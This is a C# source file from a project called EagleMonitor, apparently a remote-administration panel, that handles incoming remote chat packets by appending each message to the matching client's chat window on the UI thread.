using EagleMonitor.Networking;
using PacketLib.Packet;
using System.Drawing;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace EagleMonitor.PacketParser
{
    internal class ChatPacketHandler
        {
        public ChatPacketHandler(RemoteChatPacket chatPacket, ClientHandler clientHandler) : base() 
        {
            if (ClientHandler.ClientHandlersList[chatPacket.baseIp].chatForm != null) 
            {
                ClientHandler.ClientHandlersList[chatPacket.baseIp].chatForm.hasAlreadyConnected = true;
                ClientHandler.ClientHandlersList[chatPacket.baseIp].chatForm.messageRichTextBox.BeginInvoke((MethodInvoker)(() =>
                {
                    ClientHandler.ClientHandlersList[chatPacket.baseIp].chatForm.clientHandler = clientHandler;
                    ClientHandler.ClientHandlersList[chatPacket.baseIp].chatForm.hasAlreadyConnected = true;
                    ClientHandler.ClientHandlersList[chatPacket.baseIp].chatForm.messageRichTextBox.SelectionColor = Color.FromArgb(66, 182, 245);
                    ClientHandler.ClientHandlersList[chatPacket.baseIp].chatForm.messageRichTextBox.AppendText(chatPacket.msg);
                }));
            }
        }
    }
}
